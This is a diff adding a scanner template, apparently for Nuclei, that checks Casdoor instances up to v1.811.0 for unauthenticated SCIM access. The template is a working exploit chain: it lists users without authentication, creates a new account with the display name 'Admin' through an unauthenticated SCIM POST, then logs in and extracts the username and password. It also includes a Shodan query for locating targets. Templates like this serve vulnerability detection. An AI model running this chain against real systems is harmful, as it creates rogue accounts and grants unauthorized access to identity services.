@@ -1,0 +1,73 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - contains_all(body,"urn:ietf:params:scim:schemas:core:2.0:User","Resources",
+      "emails")
+    - contains(header,"casdoor_session_id") && status_code == 200
+    internal: true
+    type: dsl
+  raw:
+  - 'GET /scim/Users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - condition: and
+    dsl:
+    - contains_all(body,"urn:ietf:params:scim:schemas:core:2.0:User",username)
+    - status_code == 201
+    internal: true
+    type: dsl
+  raw:
+  - 'POST /scim/Users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/scim+json-H
+
+
+    {"active":true,"displayName":"Admin","emails":[{"value":"{{email}}"}],"password":"{{password}}","nickName":"{{username}}","schemas":["urn:ietf:params:scim:schemas:core:2.0:User","urn:ietf:params:scim:schemas:extension:enterprise:2.0:User"],"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User":{"organization":"built-in"},"userName":"{{username}}","userType":"normal-user"}
+
+    '
+- extractors:
+  - dsl:
+    - '"Username: " + username'
+    - '"Password: " + password'
+    type: dsl
+  matchers:
+  - condition: and
+    dsl:
+    - 'contains_all(body,"\"status\": \"ok\"","data","msg","sub")'
+    - status_code == 200
+    type: dsl
+  raw:
+  - 'POST /api/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/plain;charset=UTF-8
+
+
+    {"application":"app-built-in","organization":"built-in","username":"{{username}}","autoSignin":true,"password":"{{password}}","signinMethod":"Password","type":"login"}
+
+    '
+id: casdoor-unauth-operations
+info:
+  author: iamnoooob,rootxharsh,pdresearch
+  description: "Detects unauthorized SCIM (System for Cross-domain Identity Management)\
+    \ operations in Casdoor versions \u22641.811.0, allowing unauthenticated access\
+    \ to user management functionalities.\n"
+  metadata:
+    max-request: 3
+    runzero-review: REJECT/2025-11-17/excluding tag intrusive
+    shodan-query: html:"Casdoor"
+    verified: true
+  name: Casdoor <=v1.811.0 - Unauthenticated SCIM Operations
+  severity: critical
+  tags: casdoor,unauth,intrusive,misconfig,vuln
+variables:
+  email: '{{username}}@oast.fun'
+  password: '{{randstr_1}}'
+  username: '{{randstr}}'
